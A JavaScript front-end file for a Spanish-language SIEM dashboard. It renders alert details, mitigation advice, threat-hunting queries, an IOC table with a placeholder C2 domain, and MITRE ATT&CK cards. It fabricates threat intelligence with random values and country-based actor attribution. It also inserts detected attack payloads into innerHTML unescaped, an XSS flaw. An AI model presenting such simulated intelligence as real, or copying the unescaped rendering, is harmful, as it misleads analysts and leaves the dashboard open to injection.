            console.log(`Alert ${index}: ID="${alert.id}", Type="${alert.alert_type}"`);
        });

        // Buscar la alerta específica
        const alert = this.cachedAlerts.find(a => a.id === alertId);

        if (!alert) {
            console.error(`❌ DEBUG: Alert not found for ID: "${alertId}"`);
            console.error('Available alert IDs:', this.cachedAlerts.map(a => a.id));
            alert('Error: No se encontró la alerta especificada. Ver consola para detalles.');
            return;
        }

        console.log(`✅ DEBUG: Found alert:`, alert);
        console.log(`🎯 DEBUG: Alert type: "${alert.alert_type}"`);

        // Generar detalles específicos basados en la alerta seleccionada
        const alertDetails = this.generateDetailedAlertData(alert);
        console.log(`📊 DEBUG: Generated alert details for type: "${alertDetails.attack_type}"`);

        this.showAlertDetailsModal(alertDetails);
    }
    generateDetailedAlertData(alert) {
        console.log(`🔧 DEBUG: Generating detailed data for alert type: "${alert.alert_type}"`);

        const baseDetails = {
            id: alert.id,
            timestamp: alert.timestamp,
            severity: alert.severity,
            title: this.getAlertTitle(alert.alert_type),
            attack_type: alert.alert_type,
            confidence: alert.confidence || (0.7 + Math.random() * 0.3),
            source_ip: alert.source_ip,
            source_country: alert.source_country || this.getRandomCountry(),
            target_system: alert.target_system || this.getRandomTargetSystem(),
            attack_vector: alert.attack_vector || this.getAttackVector(alert.alert_type),
            payload: alert.payload || this.getPayloadForType(alert.alert_type),
            mitre_techniques: alert.mitre_techniques || this.getMitreTechniques(alert.alert_type),
            description: alert.description
        };

        console.log(`🎯 DEBUG: Base details created for: "${baseDetails.attack_type}"`);
        console.log(`📄 DEBUG: Payload: "${baseDetails.payload}"`);

        // Generar datos específicos según el tipo de ataque
        const typeSpecificData = this.getTypeSpecificDetails(alert.alert_type, baseDetails);
        const finalDetails = { ...baseDetails, ...typeSpecificData };

        console.log(`✅ DEBUG: Final details generated for: "${finalDetails.attack_type}"`);
        return finalDetails;
    }

    getAlertTitle(alertType) {
        console.log(`🏷️ DEBUG: Getting title for alert type: "${alertType}"`);

        const titles = {
            'SQL Injection': 'Inyección SQL Detectada',
            'XSS Attack': 'Ataque XSS Identificado',
            'Brute Force': 'Ataque de Fuerza Bruta',
            'APT Activity': 'Actividad APT Detectada',
            'Malware': 'Malware Identificado',
            'Data Exfiltration': 'Exfiltración de Datos',
            'C2 Communication': 'Comunicación C2 Detectada'
        };

        const title = titles[alertType] || 'Alerta de Seguridad';
        console.log(`📝 DEBUG: Title for "${alertType}": "${title}"`);
        return title;
    }

    getTypeSpecificDetails(alertType, baseDetails) {
        const commonTimeline = [
            {
                time: new Date(new Date(baseDetails.timestamp).getTime() + 1000).toLocaleString(),
                event: 'Primera detección del ataque',
                details: `Sistema detectó patrón ${alertType} desde ${baseDetails.source_ip}`
            },
            {
                time: new Date(new Date(baseDetails.timestamp).getTime() + 2000).toLocaleString(),
                event: 'Análisis de contexto completado',
                details: 'Validación automática de indicadores de amenaza'
            },
            {
                time: new Date(new Date(baseDetails.timestamp).getTime() + 3000).toLocaleString(),
                event: 'Alerta generada y notificación enviada',
                details: 'SOC Team notificado via dashboard y email'
            }
        ];

        const typeSpecific = {
            'SQL Injection': {
                iocs_matched: ['UNION keyword', 'SQL comment syntax', 'Single quote injection'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Payload SQL malicioso detectado',
                        details: 'Sistema detectó patrón UNION SELECT en parámetro POST'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Implementar prepared statements en aplicación web',
                    'Aplicar whitelist de caracteres permitidos en formularios',
                    'Configurar Web Application Firewall (WAF) con reglas SQL injection',
                    'Realizar testing de penetración en aplicación',
                    'Revisar logs de base de datos para buscar acceso exitoso'
                ],
                educational_notes: [
                    'La inyección SQL es una de las vulnerabilidades más comunes en aplicaciones web',
                    'El payload UNION SELECT busca combinar resultados de la consulta original con datos de otras tablas',
                    'Los comentarios SQL (--) permiten ignorar el resto de la consulta original',
                    'Esta técnica está catalogada como T1190 en MITRE ATT&CK Framework'
                ]
            },
            'XSS Attack': {
                iocs_matched: ['Script tags', 'JavaScript execution', 'Event handlers'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Script malicioso detectado',
                        details: 'Intento de inyección de JavaScript en campo de entrada'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Implementar Content Security Policy (CSP)',
                    'Sanitizar todas las entradas de usuario',
                    'Usar encoding/escaping apropiado en outputs',
                    'Configurar httpOnly flags en cookies',
                    'Realizar auditorías de código para XSS'
                ],
                educational_notes: [
                    'XSS permite a atacantes ejecutar scripts maliciosos en browsers de usuarios',
                    'Puede robar cookies, tokens de sesión y información sensible',
                    'Los ataques XSS se clasifican en reflejados, almacenados y DOM-based',
                    'Una defensa efectiva requiere validación tanto del lado cliente como servidor'
                ]
            },
            'Brute Force': {
                iocs_matched: ['Multiple failed attempts', 'Sequential login pattern', 'High request frequency'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Patrón de fuerza bruta identificado',
                        details: 'Múltiples intentos de login fallidos desde la misma IP'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Implementar rate limiting en endpoints de autenticación',
                    'Configurar account lockout tras intentos fallidos',
                    'Implementar CAPTCHA después de varios fallos',
                    'Bloquear IPs sospechosas temporalmente',
                    'Monitorear patrones de autenticación anómalos'
                ],
                educational_notes: [
                    'Los ataques de fuerza bruta prueban sistemáticamente combinaciones de credenciales',
                    'Pueden usar diccionarios de contraseñas comunes o generar combinaciones',
                    'SSH y RDP son objetivos frecuentes de estos ataques',
                    'La implementación de 2FA reduce significativamente el riesgo'
                ]
            },
            'APT Activity': {
                iocs_matched: ['Lateral movement', 'Privilege escalation', 'Persistence mechanisms'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Actividad APT detectada',
                        details: 'Movimiento lateral y técnicas de persistencia identificadas'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Aislar sistemas comprometidos inmediatamente',
                    'Implementar network segmentation',
                    'Analizar logs de todos los sistemas afectados',
                    'Cambiar credenciales de cuentas comprometidas',
                    'Implementar endpoint detection and response (EDR)'
                ],
                educational_notes: [
                    'APTs son amenazas persistentes avanzadas que permanecen ocultas por largos períodos',
                    'Utilizan múltiples técnicas para mantener acceso y evitar detección',
                    'Suelen ser patrocinadas por estados-nación o grupos criminales organizados',
                    'Requieren respuesta de incident response especializada'
                ]
            },
            'Malware': {
                iocs_matched: ['Malicious file signature', 'Suspicious process behavior', 'Network communication'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Malware detectado',
                        details: 'Archivo ejecutable con firma maliciosa identificada'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Cuarentena inmediata del archivo malicioso',
                    'Escaneo completo del sistema afectado',
                    'Actualizar signatures de antivirus',
                    'Analizar origen del malware (email, USB, descarga)',
                    'Implementar application whitelisting'
                ],
                educational_notes: [
                    'El malware puede incluir virus, trojans, ransomware y spyware',
                    'Métodos de distribución incluyen email, descargas y dispositivos USB',
                    'La detección basada en signatures puede evadir malware polimórfico',
                    'La prevención es más efectiva que la remediación post-infección'
                ]
            },
            'Data Exfiltration': {
                iocs_matched: ['Unusual data transfer', 'Off-hours activity', 'Large file uploads'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Exfiltración detectada',
                        details: 'Transferencia anómala de datos sensibles fuera de la red'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Bloquear inmediatamente el tráfico hacia destinos sospechosos',
                    'Identificar qué datos fueron comprometidos',
                    'Notificar a autoridades y clientes según regulaciones',
                    'Implementar Data Loss Prevention (DLP)',
                    'Revisar accesos a datos sensibles'
                ],
                educational_notes: [
                    'La exfiltración puede ocurrir mediante múltiples canales (HTTP, DNS, email)',
                    'Atacantes suelen comprimir y cifrar datos antes de extraerlos',
                    'El timing fuera de horarios laborales es una táctica común',
                    'Las regulaciones como GDPR requieren notificación de brechas de datos'
                ]
            },
            'C2 Communication': {
                iocs_matched: ['Command and control traffic', 'Periodic beacons', 'Encrypted channels'],
                timeline: [
                    {
                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
                        event: 'Comunicación C2 detectada',
                        details: 'Tráfico hacia servidor de comando y control identificado'
                    },
                    ...commonTimeline
                ],
                mitigation_steps: [
                    'Bloquear comunicación con servidores C2',
                    'Identificar sistemas infectados en la red',
                    'Analizar tráfico de red para otros indicadores',
                    'Implementar DNS filtering y monitoring',
                    'Configurar network-based threat detection'
                ],
                educational_notes: [
                    'Los servidores C2 permiten a atacantes controlar remotamente sistemas comprometidos',
                    'Usan diversos protocolos para evadir detección (HTTP, DNS, IRC)',
                    'El tráfico puede ser intermitente para evitar detección',
                    'La identificación temprana puede prevenir mayor daño'
                ]
            }
        };

        const specificData = typeSpecific[alertType] || {
            iocs_matched: ['Generic threat indicators'],
            timeline: commonTimeline,
            mitigation_steps: ['Revisar logs del sistema', 'Implementar monitoreo adicional'],
            educational_notes: ['Consultar documentación específica del tipo de amenaza']
        };

        // Datos comunes para todos los tipos
        const commonData = {
            related_events: [
                `Event #${Math.floor(Math.random() * 1000)}: Múltiples requests desde ${baseDetails.source_ip}`,
                `Event #${Math.floor(Math.random() * 1000)}: User-Agent sospechoso detectado`,
                `Event #${Math.floor(Math.random() * 1000)}: Actividad de reconocimiento previa`
            ],
            threat_intelligence: {
                ip_reputation: this.getIPReputation(baseDetails.source_country),
                geolocation: `${this.getRandomCity(baseDetails.source_country)}, ${baseDetails.source_country}`,
                asn: this.getRandomASN(),
                previous_attacks: `${Math.floor(Math.random() * 100)} ataques registrados en los últimos 30 días`,
                threat_actors: this.getThreatActors(baseDetails.source_country)
            }
        };

        return { ...specificData, ...commonData };
    }

    getIPReputation(country) {
        const reputations = {
            'China': 'Conocida por actividad APT y botnet Mirai',
            'Russia': 'Asociada con grupos criminales y ransomware',
            'North Korea': 'Vinculada a actividades de Lazarus Group',
            'Iran': 'Relacionada con ataques patrocinados por el estado',
            'United States': 'Posible compromiso o proxy',
            'Germany': 'Servidor comprometido o proxy legítimo',
            'Brazil': 'Actividad de botnet o sistema comprometido',
            'India': 'Tráfico sospechoso, posible sistema comprometido'
        };
        return reputations[country] || 'Actividad maliciosa reportada';
    }

    getRandomCity(country) {
        const cities = {
            'China': ['Beijing', 'Shanghai', 'Shenzhen', 'Guangzhou'],
            'Russia': ['Moscow', 'St. Petersburg', 'Novosibirsk', 'Yekaterinburg'],
            'North Korea': ['Pyongyang', 'Hamhung', 'Chongjin'],
            'Iran': ['Tehran', 'Mashhad', 'Isfahan', 'Karaj'],
            'United States': ['New York', 'Los Angeles', 'Chicago', 'Houston'],
            'Germany': ['Berlin', 'Munich', 'Frankfurt', 'Hamburg'],
            'Brazil': ['São Paulo', 'Rio de Janeiro', 'Salvador', 'Brasília'],
            'India': ['Mumbai', 'Delhi', 'Bangalore', 'Chennai']
        };
        const countryCities = cities[country] || ['Unknown City'];
        return countryCities[Math.floor(Math.random() * countryCities.length)];
    }

    getRandomASN() {
        const asns = [
            'AS4134 China Telecom',
            'AS8075 Microsoft Corporation',
            'AS13335 Cloudflare',
            'AS15169 Google LLC',
            'AS16509 Amazon.com',
            'AS12389 Rostelecom',
            'AS9318 Hanaro Telecom'
        ];
        return asns[Math.floor(Math.random() * asns.length)];
    }

    getThreatActors(country) {
        const actors = {
            'China': 'APT1, APT40, Winnti Group',
            'Russia': 'APT28, APT29, Fancy Bear',
            'North Korea': 'Lazarus Group, APT38',
            'Iran': 'APT33, APT34, OilRig',
            'United States': 'Posible actor interno o sistema comprometido',
            'Germany': 'Script kiddies o herramientas automatizadas',
            'Brazil': 'Grupos criminales locales',
            'India': 'Actividad automatizada o botnets'
        };
        return actors[country] || 'Actores desconocidos';
    }

    showAlertDetailsModal(alertDetails) {
        // Crear modal dinámicamente
        const modal = document.createElement('div');
        modal.className = 'alert-details-modal';
        modal.innerHTML = `
            <div class="modal-overlay" onclick="dashboard.closeAlertModal()"></div>
            <div class="modal-content">
                <div class="modal-header">
                    <h2>🚨 Detalles de Alerta de Seguridad</h2>
                    <button class="modal-close" onclick="dashboard.closeAlertModal()">✖️</button>
                </div>
                
                <div class="modal-body">
                    <!-- Información Principal -->
                    <div class="alert-info-section">
                        <div class="alert-title">
                            <span class="severity-badge severity-${alertDetails.severity}">${alertDetails.severity.toUpperCase()}</span>
                            ${alertDetails.title}
                        </div>
                        <div class="alert-meta">
                            <div class="meta-item">
                                <strong>Timestamp:</strong> ${this.formatTimestamp(alertDetails.timestamp)}
                            </div>
                            <div class="meta-item">
                                <strong>Confianza:</strong> ${(alertDetails.confidence * 100).toFixed(0)}%
                            </div>
                            <div class="meta-item">
                                <strong>Tipo de Ataque:</strong> ${alertDetails.attack_type}
                            </div>
                        </div>
                    </div>

                    <!-- Información de Origen -->
                    <div class="threat-source-section">
                        <h3>🌍 Información de Origen</h3>
                        <div class="threat-source-grid">
                            <div class="source-item">
                                <strong>IP de Origen:</strong> ${alertDetails.source_ip}
                            </div>
                            <div class="source-item">
                                <strong>País:</strong> ${alertDetails.source_country}
                            </div>
                            <div class="source-item">
                                <strong>Sistema Objetivo:</strong> ${alertDetails.target_system}
                            </div>
                            <div class="source-item">
                                <strong>Vector de Ataque:</strong> ${alertDetails.attack_vector}
                            </div>
                        </div>
                        
                        <div class="threat-intelligence">
                            <h4>📊 Threat Intelligence</h4>
                            <ul>
                                <li><strong>Reputación IP:</strong> ${alertDetails.threat_intelligence.ip_reputation}</li>
                                <li><strong>Geolocalización:</strong> ${alertDetails.threat_intelligence.geolocation}</li>
                                <li><strong>ASN:</strong> ${alertDetails.threat_intelligence.asn}</li>
                                <li><strong>Ataques Previos:</strong> ${alertDetails.threat_intelligence.previous_attacks}</li>
                                <li><strong>Actores de Amenaza:</strong> ${alertDetails.threat_intelligence.threat_actors}</li>
                            </ul>
                        </div>
                    </div>

                    <!-- Análisis Técnico -->
                    <div class="technical-analysis-section">
                        <h3>🔬 Análisis Técnico</h3>
                        <div class="payload-section">
                            <strong>Payload Detectado:</strong>
                            <div class="payload-code">${alertDetails.payload}</div>
                        </div>
                        
                        <div class="indicators-section">
                            <strong>IOCs Coincidentes:</strong>
                            <div class="ioc-tags">
                                ${alertDetails.iocs_matched.map(ioc => `<span class="ioc-tag">${ioc}</span>`).join('')}
                            </div>
                        </div>

                        <div class="mitre-section">
                            <strong>Técnicas MITRE ATT&CK:</strong>
                            <div class="mitre-tags">
                                ${alertDetails.mitre_techniques.map(technique => `<span class="mitre-tag">${technique}</span>`).join('')}
                            </div>
                        </div>
                    </div>

                    <!-- Timeline de Eventos -->
                    <div class="timeline-section">
                        <h3>⏱️ Timeline de Eventos</h3>
                        <div class="timeline">
                            ${alertDetails.timeline.map(event => `
                                <div class="timeline-event">
                                    <div class="timeline-time">${event.time}</div>
                                    <div class="timeline-content">
                                        <div class="timeline-title">${event.event}</div>
                                        <div class="timeline-details">${event.details}</div>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>

                    <!-- Eventos Relacionados -->
                    <div class="related-events-section">
                        <h3>🔗 Eventos Relacionados</h3>
                        <ul class="related-events-list">
                            ${alertDetails.related_events.map(event => `<li>${event}</li>`).join('')}
                        </ul>
                    </div>

                    <!-- Pasos de Mitigación -->
                    <div class="mitigation-section">
                        <h3>🛡️ Pasos de Mitigación Recomendados</h3>
                        <ol class="mitigation-list">
                            ${alertDetails.mitigation_steps.map(step => `<li>${step}</li>`).join('')}
                        </ol>
                    </div>

                    <!-- Notas Educativas -->
                    <div class="educational-section">
                        <h3>🎓 Notas Educativas</h3>
                        <ul class="educational-list">
                            ${alertDetails.educational_notes.map(note => `<li>${note}</li>`).join('')}
                        </ul>
                    </div>
                </div>

                <div class="modal-actions">
                    <button class="control-btn" onclick="dashboard.acknowledgeAlert('${alertDetails.id}')">
                        <span class="btn-icon">✅</span>
                        Reconocer Alerta
                    </button>
                    <button class="control-btn secondary" onclick="dashboard.escalateAlert('${alertDetails.id}')">
                        <span class="btn-icon">⚠️</span>
                        Escalar
                    </button>
                    <button class="control-btn secondary" onclick="dashboard.exportAlertReport('${alertDetails.id}')">
                        <span class="btn-icon">📄</span>
                        Exportar Reporte
                    </button>
                    <button class="control-btn secondary" onclick="dashboard.blockThreatSource('${alertDetails.source_ip}')">
                        <span class="btn-icon">🚫</span>
                        Bloquear IP
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
    }

    closeAlertModal() {
        const modal = document.querySelector('.alert-details-modal');
        if (modal) {
            modal.remove();
        }
    }

    escalateAlert(alertId) {
        console.log('Escalating alert:', alertId);
        alert(`Escalando alerta ${alertId}\n\nEsta alerta será marcada como de alta prioridad y notificada al equipo de respuesta a incidentes.`);
        this.closeAlertModal();
    }

    exportAlertReport(alertId) {
        console.log('Exporting alert report:', alertId);
        alert(`Exportando reporte detallado de alerta ${alertId}\n\nEn un entorno real, esto generaría un PDF con todos los detalles técnicos y recomendaciones.`);
    }

    blockThreatSource(sourceIp) {
        console.log('Blocking threat source:', sourceIp);
        alert(`Bloqueando IP de amenaza: ${sourceIp}\n\nEsta IP será añadida inmediatamente a las listas de bloqueo del firewall y WAF.`);
        this.closeAlertModal();
    }

    markAllAlertsRead() {
        console.log('Marking all alerts as read');
        // Implementar llamada al backend
    }

    filterEvents() {
        const searchTerm = document.getElementById('events-search').value.toLowerCase();
        const severityFilter = document.getElementById('events-filter').value;

        let filteredEvents = this.cachedEvents;

        if (searchTerm) {
            filteredEvents = filteredEvents.filter(event =>
                event.description?.toLowerCase().includes(searchTerm) ||
                event.source?.toLowerCase().includes(searchTerm) ||
                event.event_type?.toLowerCase().includes(searchTerm)
            );
        }

        if (severityFilter) {
            filteredEvents = filteredEvents.filter(event =>
                event.severity === severityFilter
            );
        }

        this.displayEvents(filteredEvents);
    }

    filterAlerts() {
        const statusFilter = document.getElementById('alerts-status-filter').value;

        let filteredAlerts = this.cachedAlerts;

        if (statusFilter) {
            filteredAlerts = filteredAlerts.filter(alert =>
                alert.status === statusFilter
            );
        }

        this.displayAlerts(filteredAlerts);
    }

    showAddRuleModal() {
        console.log('Showing add rule modal');
        // Implementar modal para agregar nueva regla
    }

    /// Funciones de Threat Hunting

    async loadThreatHuntingData() {
        try {
            // Cargar consultas de hunting disponibles
            await this.loadHuntQueries();
            
            // Cargar IOCs
            this.loadIOCs();
            
            // Cargar análisis MITRE
            this.loadMitreAnalysis();
            
            // Simular algunos resultados de hunting
            this.loadHuntResults();
            
        } catch (error) {
            console.error('Error cargando datos de threat hunting:', error);
        }
    }

    async loadHuntQueries() {
        try {
            // En un entorno real, esto haría fetch a /api/threat-hunt/queries
            const huntQueries = [
                {
                    id: 'hunt_001',
                    name: 'Exfiltración de Datos Fuera de Horario',
                    description: 'Busca actividad sospechosa de transferencia de datos durante horarios no laborales',
                    category: 'Data Exfiltration',
                    severity: 'high',
                    mitre_techniques: ['T1041', 'T1005'],
                    confidence_threshold: 0.6,
                    educational_context: 'Los atacantes suelen exfiltrar datos fuera del horario laboral para evitar detección.'
                },
                {
                    id: 'hunt_002',
                    name: 'Actividad APT - Movimiento Lateral',
                    description: 'Detecta patrones de movimiento lateral característicos de APTs',
                    category: 'APT Detection',
                    severity: 'critical',
                    mitre_techniques: ['T1078', 'T1021'],
                    confidence_threshold: 0.7,
                    educational_context: 'Las APTs mantienen persistencia moviéndose lateralmente por la red.'
                },
                {
                    id: 'hunt_003',
                    name: 'IOCs de Malware Conocido',
                    description: 'Búsqueda basada en indicadores de compromiso de malware conocido',
                    category: 'IOC Hunting',
                    severity: 'critical',
                    mitre_techniques: ['T1071', 'T1090'],
                    confidence_threshold: 0.8,
                    educational_context: 'Los IOCs permiten identificar amenazas conocidas.'
                }
            ];

            this.displayHuntQueries(huntQueries);
        } catch (error) {
            console.error('Error loading hunt queries:', error);
        }
    }

    displayHuntQueries(queries) {
        const container = document.getElementById('hunt-queries-grid');
        if (!container) return;

        container.innerHTML = '';

        queries.forEach(query => {
            const queryCard = document.createElement('div');
            queryCard.className = 'hunt-query-card';
            queryCard.innerHTML = `
                <div class="hunt-query-header">
                    <div class="query-name">${query.name}</div>
                    <div class="query-category ${query.category.toLowerCase().replace(' ', '-')}">${query.category}</div>
                </div>
                <div class="query-description">${query.description}</div>
                <div class="query-details">
                    <div class="mitre-techniques">
                        <strong>MITRE Techniques:</strong> ${query.mitre_techniques.join(', ')}
                    </div>
                    <div class="confidence-threshold">
                        <strong>Confianza:</strong> ${(query.confidence_threshold * 100).toFixed(0)}%
                    </div>
                    <div class="educational-context">
                        <strong>Context:</strong> ${query.educational_context}
                    </div>
                </div>
                <div class="query-actions">
                    <button class="control-btn small" onclick="dashboard.executeHunt('${query.id}')">
                        <span class="btn-icon">🔍</span>
                        Ejecutar Hunt
                    </button>
                    <button class="control-btn small secondary" onclick="dashboard.viewQueryDetails('${query.id}')">
                        <span class="btn-icon">👁️</span>
                        Detalles
                    </button>
                </div>
            `;
            container.appendChild(queryCard);
        });
    }

    loadIOCs() {
        const iocs = [
            {
                type: 'IP Address',
                value: '203.0.113.45',
                threat_level: 'HIGH',
                source: 'Threat Intelligence Feed',
                last_seen: new Date(Date.now() - 86400000).toISOString(), // 1 día atrás
                description: 'IP asociada con actividad de botnet Mirai'
            },
            {
                type: 'Domain',
                value: 'malicious-c2.example.com',
                threat_level: 'CRITICAL',
                source: 'Government Threat Intel',
                last_seen: new Date(Date.now() - 432000000).toISOString(), // 5 días atrás
                description: 'Dominio usado como C2 por APT28'
            },
            {
                type: 'File Hash',
                value: 'a1b2c3d4e5f6789...',
                threat_level: 'HIGH',
                source: 'Internal Analysis',
                last_seen: new Date(Date.now() - 172800000).toISOString(), // 2 días atrás
                description: 'Hash de malware Lazarus Group'
            },
            {
                type: 'User Agent',
                value: 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
                threat_level: 'MEDIUM',
                source: 'Automated Detection',
                last_seen: new Date(Date.now() - 3600000).toISOString(), // 1 hora atrás
                description: 'User Agent obsoleto usado por herramientas automatizadas'
            }
        ];

        this.displayIOCs(iocs);
    }

    displayIOCs(iocs) {
        const tbody = document.getElementById('iocs-table-body');
        if (!tbody) return;

        tbody.innerHTML = '';

        iocs.forEach(ioc => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td><span class="ioc-type-badge">${ioc.type}</span></td>
                <td class="ioc-value">${ioc.value}</td>
                <td><span class="threat-level-badge ${ioc.threat_level.toLowerCase()}">${ioc.threat_level}</span></td>
                <td>${ioc.source}</td>
                <td>${this.formatTimestamp(ioc.last_seen)}</td>
                <td>
                    <button class="control-btn small" onclick="dashboard.searchIOC('${ioc.value}')">
                        <span class="btn-icon">🔍</span>
                        Buscar
                    </button>
                    <button class="control-btn small secondary" onclick="dashboard.blockIOC('${ioc.value}')">
                        <span class="btn-icon">🚫</span>
                        Bloquear
                    </button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }

    loadMitreAnalysis() {
        const tactics = [
            {
                id: 'TA0001',
                name: 'Initial Access',
                techniques: ['T1190', 'T1078'],
                detections: 45,
                description: 'Técnicas para obtener acceso inicial al sistema'
            },
            {
                id: 'TA0002',
                name: 'Execution',
                techniques: ['T1059', 'T1053'],
                detections: 32,
                description: 'Técnicas para ejecutar código malicioso'
            },
            {
                id: 'TA0003',
                name: 'Persistence',
                techniques: ['T1053', 'T1547'],
                detections: 18,
                description: 'Técnicas para mantener presencia en el sistema'
            },
            {
                id: 'TA0006',
                name: 'Credential Access',
                techniques: ['T1110', 'T1003'],
                detections: 67,
                description: 'Técnicas para obtener credenciales'
            },
            {
                id: 'TA0010',
                name: 'Exfiltration',
                techniques: ['T1041', 'T1005'],
                detections: 12,
                description: 'Técnicas para exfiltrar datos'
            }
        ];

        this.displayMitreTactics(tactics);
    }

    displayMitreTactics(tactics) {
        const container = document.getElementById('mitre-tactics-grid');
        if (!container) return;

        container.innerHTML = '';

        tactics.forEach(tactic => {
            const tacticCard = document.createElement('div');
            tacticCard.className = 'mitre-tactic-card';
            tacticCard.innerHTML = `
                <div class="tactic-header">
                    <div class="tactic-id">${tactic.id}</div>
                    <div class="tactic-name">${tactic.name}</div>
                </div>
                <div class="tactic-description">${tactic.description}</div>
                <div class="tactic-stats">
                    <div class="detections-count">
                        <strong>${tactic.detections}</strong> detecciones
                    </div>
                    <div class="techniques-list">
                        <strong>Técnicas:</strong> ${tactic.techniques.join(', ')}
                    </div>
                </div>
                <div class="tactic-actions">
                    <button class="control-btn small" onclick="dashboard.analyzeTactic('${tactic.id}')">
                        <span class="btn-icon">📊</span>
                        Analizar
                    </button>
                </div>
            `;
            container.appendChild(tacticCard);
        });
    }

    loadHuntResults() {
        const results = [
            {
                query_name: 'Exfiltración de Datos Fuera de Horario',
                execution_time: new Date().toISOString(),
                matches_found: 3,
                risk_level: 'HIGH',
                confidence: 0.75,
                status: 'completed'
            },
            {
                query_name: 'Actividad APT - Movimiento Lateral',
                execution_time: new Date(Date.now() - 1800000).toISOString(),
                matches_found: 1,
                risk_level: 'CRITICAL',
                confidence: 0.85,
                status: 'completed'
            }
        ];

        this.displayHuntResults(results);
    }

    displayHuntResults(results) {
        const container = document.getElementById('hunt-results-container');
        if (!container) return;

        if (results.length === 0) {
            container.innerHTML = `
                <div class="placeholder-content">
                    <span class="placeholder-icon">🔍</span>
                    <h3>No hay resultados de hunting activos</h3>
                    <p>Ejecuta una consulta de hunting para ver resultados aquí.</p>
                </div>
            `;
            return;
        }

        container.innerHTML = '';

        results.forEach(result => {
            const resultCard = document.createElement('div');
            resultCard.className = 'hunt-result-card';
            resultCard.innerHTML = `
                <div class="result-header">
                    <div class="result-query">${result.query_name}</div>
                    <div class="result-status ${result.status}">${result.status.toUpperCase()}</div>
                </div>
                <div class="result-stats">
                    <div class="stat-item">
                        <div class="stat-label">Coincidencias</div>
                        <div class="stat-value">${result.matches_found}</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Riesgo</div>
                        <div class="stat-value risk-${result.risk_level.toLowerCase()}">${result.risk_level}</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Confianza</div>
                        <div class="stat-value">${(result.confidence * 100).toFixed(0)}%</div>
                    </div>
                </div>
                <div class="result-time">Ejecutado: ${this.formatTimestamp(result.execution_time)}</div>
                <div class="result-actions">
                    <button class="control-btn small" onclick="dashboard.viewHuntResults('${result.query_name}')">
                        <span class="btn-icon">👁️</span>
                        Ver Detalles
                    </button>
                    <button class="control-btn small secondary" onclick="dashboard.exportHuntResults('${result.query_name}')">
                        <span class="btn-icon">💾</span>
                        Exportar
                    </button>
                </div>
            `;
            container.appendChild(resultCard);
        });
    }

    // Handlers para acciones de threat hunting
    executeHunt(queryId) {
        console.log('Executing hunt query:', queryId);
        // En un entorno real, esto haría POST a /api/threat-hunt/execute/${queryId}
        alert(`Ejecutando consulta de hunting: ${queryId}\n\nEn un entorno real, esto iniciaría la búsqueda proactiva de amenazas usando los criterios definidos.`);
    }

    viewQueryDetails(queryId) {
        console.log('Viewing query details:', queryId);
        // Mostrar modal con detalles de la consulta
    }

    searchIOC(iocValue) {
        console.log('Searching IOC:', iocValue);
        alert(`Buscando IOC: ${iocValue}\n\nEsta función buscaría todas las ocurrencias de este indicador en los logs históricos.`);
    }

    blockIOC(iocValue) {
        console.log('Blocking IOC:', iocValue);
        alert(`Bloqueando IOC: ${iocValue}\n\nEste indicador sería añadido a las listas de bloqueo automático.`);
    }

    analyzeTactic(tacticId) {
        console.log('Analyzing MITRE tactic:', tacticId);
        alert(`Analizando táctica MITRE: ${tacticId}\n\nEsto mostraría un análisis detallado de las técnicas detectadas para esta táctica.`);
    }

    viewHuntResults(queryName) {
        console.log('Viewing hunt results for:', queryName);
        // Mostrar modal con resultados detallados
    }

    exportHuntResults(queryName) {
        console.log('Exporting hunt results for:', queryName);
        alert(`Exportando resultados de: ${queryName}\n\nEn un entorno real, esto generaría un reporte detallado en PDF/CSV.`);
    }
}

// Inicializar dashboard cuando el DOM esté listo
let dashboard;

document.addEventListener('DOMContentLoaded', () => {
    dashboard = new RustSIEMDashboard();
});

// Añadir estilos dinámicos para badges de severidad
const style = document.createElement('style');
style.textContent = `
    .severity-badge {
        padding: 4px 8px;
        border-radius: 4px;
        font-size: 0.75rem;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    
    .severity-critical { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
    .severity-high { background: rgba(245, 158, 11, 0.2); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
    .severity-warning { background: rgba(245, 158, 11, 0.2); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
    .severity-medium { background: rgba(59, 130, 246, 0.2); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.3); }
    .severity-low { background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); }
    .severity-info { background: rgba(148, 163, 184, 0.2); color: #94a3b8; border: 1px solid rgba(148, 163, 184, 0.3); }
    
    .stream-critical { color: #ef4444; font-weight: 600; }
    .stream-warning { color: #f59e0b; font-weight: 600; }
    .stream-info { color: #94a3b8; }
    
    .event-description {
        max-width: 300px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    
    .control-btn.small {
        padding: 4px 8px;
